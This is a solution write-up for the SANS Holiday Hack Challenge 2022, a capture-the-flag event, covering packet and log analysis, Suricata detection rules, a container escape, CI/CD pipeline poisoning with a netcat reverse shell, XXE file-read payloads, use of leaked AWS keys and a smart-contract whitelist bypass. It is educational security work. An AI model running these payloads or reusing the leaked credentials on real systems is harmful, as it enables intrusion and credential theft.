# SANS Holiday Hack 2022 Writeup
### 1 - KringleCon Orientation
Following the instructions you're given is enough to complete this challenge :).

## Recover the Tolkien Ring
### 2 - Wireshark Practice
After downloading a wireshark PCAP file from a link in our badge, we're asked to answer a few questions about the packet capture.

---
**Q:** There are objects in the PCAP file that can be exported by Wireshark and/or Tshark. What type of objects can be exported from this PCAP?

**A:** HTTP

**Explanation:** In the wireshark top menu bar, selec File -> Export Objects. There are 5 options to choose from. DICOM, HTTP, IMF, SMB, and TFTP. By checking through each one, we find the only one that has objects to export is HTTP.

---
**Q:** What is the file name of the largest file we can export?

**A:** app.php

**Explanation:** After going to File -> Export Objects -> HTTP, we see that the largest file is app.php with a size of 808 kB.

---
**Q:** What packet number starts that app.php file?

**A:** 687

**Explanation:** Under the same menu of the last question, we can see beside the app.php row that it starts at packet 687.

---
**Q:** What is the IP of the Apache server?

**A:** 192.185.57.242

**Explanation:** Put a filter in for HTTP traffic, and then select any of the GET requests. The destination server is Apache and its IP is 192.185.57.242.

---
**Q:** What file saved to the infected host?

**A:** Ref_Sept24-2020.zip

**Explanation:** Looking at the HTTP traffic, we see one HTTP response with some file data. At the end of the file data we see the following line `saveAs(blob1, 'Ref_Sept24-2020.zip');`.

---
**Q:** Attackers used bad TLS certificates in this traffic. Which countries were they registered to?

**A:** Israel, South Sudan.

**Explanation:** Looking through the TLS Handshake traffic, we find the TLS certificates used by the attackers were issued by the countries IE (Israel), SS (South Sudan).

---
**Q:** Is the host infected?

**A:** Yes.

**Explanation:** In the response to the second GET request for /app.php, a script was downloaded which ran the code to save the zip file as shown above.

---

### 3 - Windows Event Logs
A windows computer is suspected of have being attacked by Grinchum. So we look through the powershell logs to find out more.

**Q:** What month/day/year did the attack take place? For example, 09/05/2021?

**A:** 12/24/2022

**Explanation:** Grouping events by day, we can see the number of events that happened on each day. December 24th has an abnormally high number compared to others, so that is a good guess.

---
**Q:** An attacker got a secret from a file. What was the original filename?

**A:** recipe_updated.txt

**Explanation:** Sort the events on December 24th by Task Category, and look through the events with Task Category of "Execute a Remote Command". Not too far down, we find the command `cat .\recipe_updated.txt` with Event ID 4104.

---
**Q:** The contents of the previous file were retrieved, changed, and stored to a variable by the attacker. This was done multiple times. Submit the last full PowerShell line that performed only these actions.

**A:** `$foo = Get-Content .\Recipe| % {$_ -replace 'honey', 'fish oil'}`.

**Explanation:** Can be found by scrolling down slightly further in the event logs for December 24th in Task Category "Execute a Remote Command".

---
**Q:** After storing the altered file contents into the variable, the attacker used the variable to run a separate command that wrote the modified data to a file. This was done multiple times. Submit the last full PowerShell line that performed only this action.

**A:** `$foo | Add-Content -Path 'Recipe'`.

**Explanation:** Can be found by scrolling down even further in the event log for December 24th in category "Execute a Remote Command".

---
**Q:** The attacker ran the previous command against a file multiple times. What is the name of this file?

**A:** Recipe.txt

**Explanation:** Scroll down further in the event log to find the following command `$foo | Add-Content -Path 'Recipe.txt'`.

---
**Q:** Were any files deleted? (Yes/No)

**A:** Yes

**Explanation:** The following command was found in the event log, which deletes a file: `del .\Recipe.txt`.

---
**Q:** Was the original file (from question 2) deleted? (Yes/No)

**A**: No

**Explanation:** The event log does not show that file being deleted.

---
**Q:** What is the Event ID of the log that shows the actual command line used to delete the file?

**A:** 4104

**Explanation:** Read the event ID from the column in the event log.

---
**Q:** Is the secret ingredient compromised (Yes/No)?

**A:** Yes

**Explanation:** Commands in the event log show the Recipe.txt file being saved to a variable `foo` with the ingredient "honey" being replaced with "fish oil". This data is then piped back into Recipe.txt.

---
**Q:** What is the secret ingredient?

**A:** honey

**Explanation:** honey is the ingredient being replaced by fish oil so its likely that this was the secret ingredient being tampered with in the recipe.

---


### 4 - Suricata Regatta

**Question 1**

First, please create a Suricata rule to catch DNS lookups for adv.epostoday.uk.
Whenever there's a match, the alert message (msg) should read Known bad DNS lookup, possible Dridex infection.

**Answer**

`alert dns $HOME_NET any -> any any (msg:"Known bad DNS lookup, possible Dridex infection"; dns.query; content:"adv.epostoday.uk";)`

---
**Question 2**

STINC thanks you for your work with that DNS record! In this PCAP, it points to 192.185.57.242.
Develop a Suricata rule that alerts whenever the infected IP address 192.185.57.242 communicates with internal systems over HTTP.
When there's a match, the message (msg) should read Investigate suspicious connections, possible Dridex infection.

**Answer**

`alert http 192.185.57.242 any <> $HOME_NET any (msg:"Investigate suspicious connections, possible Dridex infection"; sid:182;)`

---
**Question 3**

We heard that some naughty actors are using TLS certificates with a specific CN.
Develop a Suricata rule to match and alert on an SSL certificate for heardbellith.Icanwepeh.nagoya.
When your rule matches, the message (msg) should read Investigate bad certificates, possible Dridex infection.

**Answer**

`alert tls any any -> any any (msg:"Investigate bad certificates, possible Dridex infection"; tls.issuerdn:"CN=heardbellith.Icanwepeh.nagoya"; sid:183;)`

---

**Question 4**

OK, one more to rule them all and in the darkness find them.
Let's watch for one line from the JavaScript: let byteCharacters = atob
Oh, and that string might be GZip compressed - I hope that's OK!
Just in case they try this again, please alert on that HTTP data with message Suspicious JavaScript function, possible Dridex infection.

**Answer**

`alert http any any -> any any (msg:”Suspicious JavaScript function, possible Dridex infection”; http.response_body; content:”let byteCharacters = atob”; sid:23744;)`

---


## Recover the Elfen Ring

### 5 - Clone with a Difference
We just need you to clone one repo: git clone git@haugfactory.com:asnowball/aws_scripts.git 
This should be easy, right?

The url given here is in the SSH format. Another format that can be used is HTTP. 

`git clone https://haugfactory.com/asnowball/aws_scripts.git`

### 6 - Prison Escape
Working from inside a container, you should not be able to access the host system unless explicitly allowed. However in some cases where a container is misconfigured, this can be possible. When a docker container is run with the `--priveleged` flag, it gives access to almost everything. This should only be used in development, but is sometimes left in production environments.

Once inside the container, we can check if the container is in priveleged mode by trying to run the `fdisk` command.

`$ sudo fdisk -l`

![](images/prison_escape/fdisk.png)

Here we see that the device /dev/vda (host drive) has shown up. We would not be able to see this if the container wasn't in priveleged mode. So what we will do now is mount the device to a directory in the container, which will allow us to explore the whole host file system!

Make a directory to mount to:

`$ sudo mkdir /mnt/temp`

Mount the device to the directory we just created:

`$ sudo mount /dev/sva /mnt/temp`

Change directory to the mount point:

`$ cd /mnt/temp`

We can now see the host file system, so print the flag!

`$ cat home/jailer/.ssh/jail.key.priv`

![](images/prison_escape/answer.png)

Final answer: `082bb339ec19de4935867`


### 7 - Jolly CI/CD
We are tasked with retrieving the Elfen ring from a wordpress server. The following hints were given to us.

**Hint 1:** \
The thing about Git is that every step of development is accessible – even steps you didn't mean to take! git log can show code skeletons. 

**Hint 2:** \
If you find a way to impersonate another identity, you might try re-cloning a repo with their credentials.

Upon talking to Tinsel Upatree???? they tell us the git url for the wordpress repository:

`http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git`

After waiting for the power to come back on to the server room, we can clone this repository to check it out.

`$ git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git`

Thinking about the first hint, we can take a look at the git logs to see if anything is suspicious.

![](images/jolly_cicd//git_log.png)

In one git log line, we see the message "whoops". This is intriguing so let's take a closer look. To look specifically at this commit we use the `git show <commit-id>` command.

`$ git show abdea0ebb21b156c01f7533cea3b895c26198c98`

As you can see, this commit shows a private key that someone has removed from the repository, however the git logs still show this file so we can copy it and save into a file.

![](images/jolly_cicd/git_show.png)

Copy the private key, and save it in a the file `~/.ssh/repo_key` making sure to remove the extra leading "-" signs on each line. You will have to create the `.ssh` directory first.

![](images/jolly_cicd/priv_key_1.png)

Next we will create an SSH config file. This will help us manage our new identity.

`$ sudo vim ~/.ssh/config`

![](images/jolly_cicd/ssh_config.png)

Now we can remove the current repo directory and re-clone with our new identity.

`$ rm -rf wordpress.flag.net.internal`

`$ git clone git@gitlab:rings-of-powder/wordpress.flag.net.internal.git`

Now, take a look in the repo to see what we have to work with. The `ls -la` command is usually a good start.

![](images/jolly_cicd/list_all.png)

Apart from a bunch of php files, something interesting that we can see is the `.gitlab-ci.yml` file. This is the configuration file for the CI/CD machine when a commit gets pushed. Lets take a look at it.

![](images/jolly_cicd/cicd_config.png)

It looks like this config file specifies a script to be run when changes are pushed. Right now, it is just copying the current directory on the CI/CD server to the remote wordpress server's web root directory. This is being done remotely from the CI/CD server so the server must be using an ssh key to access the wordpress server. If we can get into the CI/CD server we could probably steal that key to use ourselves.

So back to the script being run in the config file, it seems we could likely modify this and run our own code to try and gain access to the CI/CD server. There are many ways to accomplish this. I will use a simple reverse shell.

First, comment out the current script line, and replace it with `netcat command nc <your-machine-ip-address> 4444 -e /bin/bash`. You can find your machine's ip address with `ifconfig`.

![](images/jolly_cicd/cicd_config_edited.png)

Now lets stage all git changes.

`$ git add -A`

Create a commit.

`$ git commit -m "pwned"`

And finally we will push the changes. Once we push the changes though, we will quickly have to run the netcat listener for our reverse shell so we catch the request from the gitlab server. Lets do it.

`$ git push`

`$ nc –lvp 4444`

We're in!

![](images/jolly_cicd/connection_received.png)

Now lets find that private key we think probably exists. First place to check is the file listed in the original `.gitlab-ci.yml` file (/etc/gitlab-runner/hhc22-wordpress-deploy).

`$ cat /etc/gitlab-runner/hhc22-wordpress-deploy`

That was easy.

![](images/jolly_cicd/priv_key_2.png)

Let's copy this to our notes and exit out of the netcat shell. Now create a new private key file `~/.ssh/wordpress_key` and save this key to it. Add another host in the `~/.ssh/config` as well.

![](images/jolly_cicd/ssh_config_2.png)

Now lets try and ssh into the wordpress server.

`ssh root@wordpress`

![](images/jolly_cicd/ssh_wordpress.png)

Now if we do an `ls /` we can see the file `flag.txt`.

`$ cat /flag.txt`

![](images/jolly_cicd/flag.png)

Flag: oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT

---

## Recover the Web Ring
### 8 - Boria pcap mining
### 8.1 - Naughty IP
Load the victim.pcap file, and filter for HTTP traffic. By simply browsing the traffic in chronological order, we can see that a specific IP address seems to be fuzzing different URLs on the website such as /mail, /members, /nav and more.

The IP address associated with this is `18.222.86.32`.

### 8.2 - Credential Mining
Load the pcap file, and filter for HTTP traffic with either the ip.src or ip.dst as `18.222.86.32` along with filtering for HTTP. Then sort by time. The first request with url-encoded form data was made with the username `alice`.

### 8.3 - 404 FTW
Filter traffic with to either have ip.src or ip.dst with ip `18.222.86.32` and also be HTTP. 

`(((ip.dst == 18.222.86.32 || ip.src == 18.222.86.32) && (http)))`

Now sort by time, and find the spot where they start fuzzing all the different URLs. Now scroll down until you see a 200 response. Take a look at the request for that response and you will find that the URL was `/proc`.

### 8.4 - IMDS, XXE, and Other Abbreviations
Filter for the naughty IP from before, and also XML as the protocl. Take a look at the XXE payload. We can see the URL:

`http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`

### 9 - Open Boria Mine Door
Through looking at the website source code, we find that each pin is it's own iFrame. This is useful to know so we can inspect each pin individually while trying to solve it.

**Cell 1:**
First lets inspect the iFrame for Cell 1. There is an interesting comment that has been left in the code. 

![](images/boria_mine/interesting_comment.png)

If we try it as input to the Cell, we see that it works!

![](images/boria_mine/cell1.png)

**Cell 2:**

Now, looking at the source code for Cell 2, we can see that there is a comment saying "TODO: FILTER OUT HTML FROM USER INPUT". This is an interesting hint, because as we saw on the first cell, it takes the input and displays it in the box and if the text connects the pipes on either side of the cell, then it unlocks. This comment clearly shows that they are not filtering HTML in this cell and we might be able to do something clever to connect the pipes, which are no longer at the same height. An HTML element that might be of use here is the SVG. By using an all white SVG element as input, we can try to get this unlocked.

```
<svg version="1.1" width="300" height="200">
  <rect width="100%" height="100%" fill="white" />
</svg>
```

It works!

![](images/boria_mine/cell2.png)

**Cell 3:**

Ok, so using our knowledge from Cell 2, maybe for this one we can use the same strategy but change the color to blue to match the pipes. Lets try.

```
<svg version="1.1" width="300" height="200">
  <rect width="100%" height="100%" fill="blue" />
</svg>
```

Nice!

![](images/boria_mine/cell3.png)

**Cell 4:**

Now, taking a look at the source code for cell 4, we can see that they are doing some input filtering. Specifically, they are filtering the following characters "<" and ">". The trick here though, is that they are only filtering the first of each character. So to get around this, we just have to double up the first of these characters to get it past. Of course, we also have to start getting creative with our SVG element. A white rectangle up top and a blue one down below should suffice. Lets try.

```
<<svg version="1.1" width="300" height="200">>
  <rect width="100%" height="100%" fill="blue" />
  <rect width="100%" height="50%" fill="white" />
</svg>
```

Success!

![](images/boria_mine/cell4.png)

**Cell 5:**

Looking at the source code for Cell 5, we see that they have gotten smarter and started globally filtering our angle tags for html elements. This means that it will not only remove the first of each, but every occurance. Luckily for us though, they have not gotten that much smarter since they are only filtering input on the client side. 

The filtering function called `sanitizeInput()` is called on the onblur event for the input element. We can simply edit the code in the browser and remove this event call from the input element, and just like that bypass their filtering.

![](images/boria_mine/remove_onblur.png)

Now, using our SVG skills once more, we need to adapt as it is a little more complex.

```
<svg version="1.1" width="300" height="200">
    <rect width="100%" height="100%" fill="red"/>
    <rect width="10%" height="50%" x="180px" y="70px" fill="blue"/>
    <rect width="100%" height="10%" y="150px" fill="blue"/>
</svg> 
```

![](images/boria_mine/cell5.png)

Done!

**Cell 6:**

Finally, we are on the last cell. Taking a look at the source code, there doesnt seem to be any filtering. The layout of the pipes in this one are a bit more complex and with a new green colour. I tried this with just regular green, but it did not work. It seems to only work with an exact colour that matches the pipe. I thought for a while on how to do this, and decided to download the static background image, load the file into gimp and figure out the exact colour green they were using. I am sure there is a better way to do this, but I couldn't think of one!

Here is the static image I downloaded.

![](images/boria_mine/wiring.png)

After loading into gimp, I used the eyedropper tool to get the specific shade of green. It was `#00ff00`.

Now lets put together our SVG.

```
<svg version="1.1" width="100%" height="180px">
  <rect width="120%" height="1200px" fill="blue" />
  <rect width="100%" height="65%" fill="red" />
  <rect width="100%" height="30%" fill="#00ff00" />
</svg>
```

It works!

![](images/boria_mine/cell6.png)

### 10 - Glamtariel's Fountain
This was an interesting one. First thing I did was check the source code to see if anything was obvious. Unfortunately I wasn't able to find much other than some stuff about XML which sort of confirmed the hint we were given about XXE being a part of this challenge. The next hint talked about how the capitalized letters that are spoken in the game may be hints on how to solve the problem. The hints I gathered are as follows:

 - TRAFFIC FLIES
 - PATH
 - TAMPER
 - APP
 - TYPE
 - SIMPLE FORMAT
 - RINGLIST

After playing through the game and reading the dialogue, some things started to stand out to me. It was obvious that there was a ringlist hidden somewhere, and the hint SIMPLE FORMAT seemed to say that it would be something like a .txt or .csv file. The TYPE hint seemed to me like it was referencing XML (for XXE).

So lets try something out. After playing the game for a while, we arrive at a section with 4 rings to move around. I could never seem to get any further so I decided to take a look at the request data. 

Looking through, we see the data with the following form:

```
{
    "imgDrop":"img2",
    "who":"princess",
    "reqType":"json"
}
```

The reqType field is quite interesting. This implies that there are multiple accepted types, which confirms our suspicion about XML. Lets convert this to XML, re-send the request and see what happens. Also make sure to change the Content-Type header to `application/xml`.

```
<?xml version="1.0" encoding="UTF-8"?>
<root>
    <imgDrop>img2</imgDrop>
    <who>princess</who>
    <reqType>xml</reqType>
</root>
```

Now we get back the following response with a 200 status:

```
{
  "appResp": "I love rings of all colors!^She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though.",
  "droppedOn": "none",
  "visit": "none"
}
```

This is a new response, so it shows that this was accepted by the server. Now my idea was to start trying out xxe payloads until something sticks. After a lot of trial and error I came upon the following payload:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///app/static/images/ringlist.txt"> ]>
<root>
   <imgDrop>&xxe;</imgDrop>
   <reqType>xml</reqType>
   <who>princess</who>
</root>
```

Using the APP hint in the path, along with the static/images directory which can be seen in the path for images in the HTTP responses and the ringlist.txt file, we get the following response:

```
{
  "appResp": "Ah, you found my ring list! Gold, red, blue - so many colors! Glad I don't keep any secrets in it any more! Please though, don't tell anyone about this.^She really does try to keep things safe. Best just to put it away. (click)",
  "droppedOn": "none",
  "visit": "static/images/pholder-morethantopsupersecret63842.png,262px,100px"
}
```

The following image is what is linked to in the response:

![](images/glamtariels_fountain/pholder.png)

Looking on the image itself, we see 3 different pieces of information:
 - x_phial_pholder_2022
 - bluering.txt
 - redring.txt

Using these hints, I assumed there must be a folder named `x_phial_pholder_2022` with the files `redring.txt` and `bluering.txt` in it. Lets try the following:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/redring.txt"> ]>
<root>
   <imgDrop>&xxe;</imgDrop>
   <reqType>xml</reqType>
   <who>princess</who>
</root>
```

This works and returns this:

```
{
  "appResp": "Hmmm, you still seem awfully interested in these rings. I can't blame you, they are pretty nice.^Oooooh, I can just tell she'd like to talk about them some more.",
  "droppedOn": "none",
  "visit": "none"
}
```

Now, lets try the same but with the blue ring.

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/bluering.txt"> ]>
<root>
   <imgDrop>&xxe;</imgDrop>
   <reqType>xml</reqType>
   <who>princess</who>
</root>
```

And we get this:

```
{
  "appResp": "I love these fancy blue rings! You can see we have two of them. Not magical or anything, just really pretty.^She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though.",
  "droppedOn": "none",
  "visit": "none"
}
```

This doesn't seem to give us any extra information. Let's try it with the last colour ring that was in the game. Silver ring (silverring.txt):

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/silverring.txt"> ]>
<root>
   <imgDrop>&xxe;</imgDrop>
   <reqType>xml</reqType>
   <who>princess</who>
</root>
```

```
{
  "appResp": "I'd so love to add that silver ring to my collection, but what's this? Someone has defiled my red ring! Click it out of the way please!.^Can't say that looks good. Someone has been up to no good. Probably that miserable Grinchum!",
  "droppedOn": "none",
  "visit": "static/images/x_phial_pholder_2022/redring-supersupersecret928164.png,267px,127px"
}
```

This response includes a link to an image:

![](images/glamtariels_fountain/redring.png)

We can see that there is something written on the ring. Zooming in, we can read the following:

`goldring_to_be_deleted.txt`

Let's put that in our XXE payload and see what we get!

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt"> ]>
<root>
   <imgDrop>&xxe;</imgDrop>
   <reqType>xml</reqType>
   <who>princess</who>
</root>
```

```
{
  "appResp": "Hmmm, and I thought you wanted me to take a look at that pretty silver ring, but instead, you've made a pretty bold REQuest. That's ok, but even if I knew anything about such things, I'd only use a secret TYPE of tongue to discuss them.^She's definitely hiding something.",
  "droppedOn": "none",
  "visit": "none"
}
```

Now this doesn't give us any directly helpful information, but I noticed the word REQ was capitalized, meaning it is probably another hint. After a lot of trial and error (and a small hint) I realized that REQ, was hinting towards the reqType field in the request body. Once realizing this, I tried adding my XXE entity to that field instead of the img field.

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt"> ]>
<root>
   <imgDrop>img1</imgDrop>
   <reqType>&xxe;</reqType>
   <who>princess</who>
</root>
```

```
{
  "appResp": "No, really I couldn't. Really? I can have the beautiful silver ring? I shouldn't, but if you insist, I accept! In return, behold, one of Kringle's golden rings! Grinchum dropped this one nearby. Makes one wonder how 'precious' it really was to him. Though I haven't touched it myself, I've been keeping it safe until someone trustworthy such as yourself came along. Congratulations!^Wow, I have never seen that before! She must really trust you!",
  "droppedOn": "none",
  "visit": "static/images/x_phial_pholder_2022/goldring-morethansupertopsecret76394734.png,200px,290px"
}
```

Nice! Now we've been given the golden ring! Let's take a look at it through the image that was linked.

![](images/glamtariels_fountain/goldring.png)

The flag for this one is the filename of the ring she gives us. As we can see from the response with the golden ring, the filename is:

`goldring-morethansupertopsecret76394734.png`

## Recover the Cloud Ring
### 11 - AWS CLI Intro
For this challenge, simply following the prompts is good enough for completion.

![](images/aws_cli_intro/completed.png)

### 12 - Trufflehog Search
We're asked to find secrets in a git repo by using the tool Trufflehog. Install trufflehog's binaries from their github, and give the binary execution permissions. Now run the command.

`./trufflehog git https://haugfactory.com/orcadmin/aws_scripts`

```
Found unverified result 🐷🔑❓
Detector Type: AWS
Decoder Type: PLAIN
Raw result: AKIAAIDAYRANYAHGQOHD
Repository: https://haugfactory.com/orcadmin/aws_scripts
Timestamp: 2022-09-07 07:53:12 -0700 -0700
Line: 6
Commit: 106d33e1ffd53eea753c1365eafc6588398279b5
File: put_policy.py
Email: asnowball <alabaster@northpolechristmastown.local>
```

As you can see, we seem to have found a secret. Lets go check out that commit on the repo page.

![](images/trufflehog/keys.png)

```
aws_access_key_id="AKIAAIDAYRANYAHGQOHD",
aws_secret_access_key="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"
```

The flag we were looking for was the name of the file that the AWS credentials were in.

ANSWER FLAG: put_policy.py

Done!

### 13 - Exploitation via AWS CLI
First configure the credentials we found with trufflehog by running `aws configure`. Then run `aws sts get-caller-identity`.

![](images/exploitation_via_aws_cli/step1.png)

```
{
    "UserId": "AIDAJNIAAQYHIAAHDDRA",
    "Account": "602123424321",
    "Arn": "arn:aws:iam::602123424321:user/haug"
}
```

Next, we're asked to look through the iam documentation to find and run the command to list attached user policies.

`aws iam list-attached-user-policies --user-name haug`

```
{
    "AttachedPolicies": [
        {
            "PolicyName": "TIER1_READONLY_POLICY",
            "PolicyArn": "arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY"
        }
    ],
    "IsTruncated": false
}
```
Now view or get the policy that is attached to your user.

`aws iam get-policy --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY`

```
{
    "Policy": {
        "PolicyName": "TIER1_READONLY_POLICY",
        "PolicyId": "ANPAYYOROBUERT7TGKUHA",
        "Arn": "arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY",
        "Path": "/",
        "DefaultVersionId": "v1",
        "AttachmentCount": 11,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "Policy for tier 1 accounts to have limited read only access to certain resources in IAM, S3, and LAMBDA.",
        "CreateDate": "2022-06-21 22:02:30+00:00",
        "UpdateDate": "2022-06-21 22:10:29+00:00",
        "Tags": []
    }
}
```

Now, we're asked to view the default version of the policy. From the response of the previous question, we can see that the default version id is v1.

`aws iam get-policy-version --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY --version-id v1`

```
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Action": [
                        "lambda:ListFunctions",
                        "lambda:GetFunctionUrlConfig"
                    ],
                    "Resource": "*"
                },
                {
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetUserPolicy",
                        "iam:ListUserPolicies",
                        "iam:ListAttachedUserPolicies"
                    ],
                    "Resource": "arn:aws:iam::602123424321:user/${aws:username}"
                },
                {
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetPolicy",
                        "iam:GetPolicyVersion"
                    ],
                    "Resource": "arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY"
                },
                {
                    "Effect": "Deny",
                    "Principal": "*",
                    "Action": [
                        "s3:GetObject",
                        "lambda:Invoke*"
                    ],
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v1",
        "IsDefaultVersion": false,
        "CreateDate": "2022-06-21 22:02:30+00:00"
    }
}
```

Now we are asked to list the inline policies associated with our user. We can list policies with the following command.

`aws iam list-user-policies --user-name haug`

```
{
    "PolicyNames": [
        "S3Perms"
    ],
    "IsTruncated": false
}
```

Now based on the previous response, we want to get the inline policy for our user. Use the following command.

`aws iam get-user-policy --user-name haug --policy-name S3Perms`

```
{
    "UserPolicy": {
        "UserName": "haug",
        "PolicyName": "S3Perms",
        "PolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Action": [
                        "s3:ListObjects"
                    ],
                    "Resource": [
                        "arn:aws:s3:::smogmachines3",
                        "arn:aws:s3:::smogmachines3/*"
                    ]
                }
            ]
        }
    },
    "IsTruncated": false
}
```

Now, we can see we have permissions to this s3 bucket. We're asked to list the objects in this bucket.

`aws s3api list-objects --bucket smogmachines3`

*Output too long, not shown.*

Next we're asked to list lambda functions.

`aws lambda list-functions`

*Output too long, not shown.*

We're told that lambda functions have public URLs from which they are directly accessible, and to find that URL for this function.

`aws lambda get-function-url-config --function-name smogmachine_lambda`

```
{
    "FunctionUrl": "https://rxgnav37qmvqxtaksslw5vwwjm0suhwc.lambda-url.us-east-1.on.aws/",
    "FunctionArn": "arn:aws:lambda:us-east-1:602123424321:function:smogmachine_lambda",
    "AuthType": "AWS_IAM",
    "Cors": {
        "AllowCredentials": false,
        "AllowHeaders": [],
        "AllowMethods": [
            "GET",
            "POST"
        ],
        "AllowOrigins": [
            "*"
        ],
        "ExposeHeaders": [],
        "MaxAge": 0
    },
    "CreationTime": "2022-09-07T19:28:23.808713Z",
    "LastModifiedTime": "2022-09-07T19:28:23.808713Z"
}
```

All done!

## Recover the Burning Ring of Fire
### 14 - Buy a Hat
This challenge is pretty simple. Instructions are available at the kiosk where you buy the hats.

1. First search for a hat you like, and remember it's ID.
2. Also note down the wallet address for the buy a hat kiosk. This is shown with the hat ID when you click on a hat.
3. Go to the KTM which is just to the right of the hat kiosk and click "Approve a KringleCoin transfer".
4. Put the kiosk wallet address in the "To Address" field, 10 in the "Amount" field, and your key in the "Your Key" field. Then click "Approve Transfer".
5. Now go back to the hat kiosk and click the button that says "Approved a transaction? Know your hat ID? Click here to buy".
6. Now put your wallet address in the "Your Wallet Address" field, and the hat ID you saved earlier in the "HAT ID" field.
7. Finally click "Make your purchase!".
8. Congrats! You just bought a hat with KringleCoin!

![](images/buy_a_hat/hat.png)

### 15 - Blockchain Divination
Our objective here is to use the blockchain explorer to find the address at which the KringleCoin smart contract is deployed. My assumption is that this will be at an early address in the blockchain since it is the currency which the blockchain is built upon. Let's take a look.

Open the blockchain explorer. It will open up to the latest block, but we will start at the beginning in our search. At the top of the page, change the block number to 1.

![](images/blockchain_divination/block_number.png)

Scrolling down, we can see that our assumption was right. Block #1 holds the smart contract for KringleCoin.

![](images/blockchain_divination/address.png)

We found our flag!

**KringleCoin Smart Contract Address:** `0xc27A2D3DE339Ce353c0eFBa32e948a88F1C86554`

### 16 - Exploit a Smart Contract
We've been given a task of exploiting the Bored Sporc Rowboat Society (BSRS) smart contract to add ourselves to the "approved list" for the presale of these Bored Sporc NFT's.

Through some research I learned that the way that the BSRS validates whether you are on the list of approved buyers, is through a data structure called a merkle tree. This merkle tree is basically a hash of every approved wallet address, then hashed together with its immediate neighbour in the tree, and then continuing the same thing until you reach a single root hash.

![](images/BSRC/merkle_tree.jpg)

If you were legitimally added to the "approved" list, then you would have been given the root hash value, along with some "proof values" which are just hashes at another point in the tree other than the root node. These proof values are used to validate the data in a tree without requiring access to the entire data structure.

So to validate that you are indeed a part of the "approved" list, you would take the persons wallet address, the root node value, and the proof values. Without explaining all the math, with this information you could deduce whether the provided wallet address is one of the approved addresses that make up the tree.

That's nice and all, but how do we get on the list if we didn't actually do it legitimately? Well, we would have to somehow change the result of their "check" so that is falsely indicates that we are on the "approved" list. With a bit of curiosity, I decided to check what data the BSRS website was sending to the server upon checking a wallet address.

![](images/BSRC/post_data.png)

Bingo.

When validating something, it should always be done on the server, and the constant values used to do the validation (root value in this case) should also be stored on the server (preferrably stored in environment variables). Because that has not been done here, we can simply create our own merkle tree, and send our own values here for the server to check.

One of the hints provided a nice github repository for doing this.

[Make your own Merkle Tree](https://github.com/QPetabyte/Merkle_Trees)

Once you've cloned the repository, we need to edit the `merkle_tree.py` file to add our own leaf node addresses. One will need to be your wallet address, and the other can just be all zeroes.

```
allowlist = ['0x2CA7a7d907D84eeCFEA21eA1c05873329BB495f2','0x0000000000000000000000000000000000000000']
```

Now, lets build and run the docker container.

![](images/BSRC/build_and_run.png)

As you can see, we've been given a root node hash value and a proof value. Now we can take this, our wallet address, and the proof value to inject into the BSRC website request and secure ourselves our own Bored Sporc!

I personally used Burp Community to do this, but you could use Zap or even browser dev tools if you wanted. 

Go to the BSRS website, input your wallet address and the proof value we generated, set Burp to intercept "ON" and click "Go!". Now switch over to Burp, change the root value to the one we generated and then turn intercept "OFF". You should get a success response on the website.

Now all you need to do is authorize a transfer for 100 KC at the KTM, and do the same thing we just did, except this time uncheck the "Validate Only" box and hit "Go!".

![](images/BSRC/req_success.png)

![](images/BSRC/web_success.png)

We now are the proud owners of a Bored Sporc!

```
{
    "name": "BSRS Token #000119", 
    "description": "Official Bored Sporc Rowboat Society Sporc #000119",
    "image": "https://boredsporcrowboatsociety.com/TOKENS/TOKENIMAGES/BSRS119.png",
    "external_url": "https://boredsporcrowboatsociety.com/TOKENS/BSRS119", 
    "token_id": 119
}
```

![](images/BSRC/119.png)

And that is it for KringleCon 2022. Thanks to everyone at SANS for putting it together!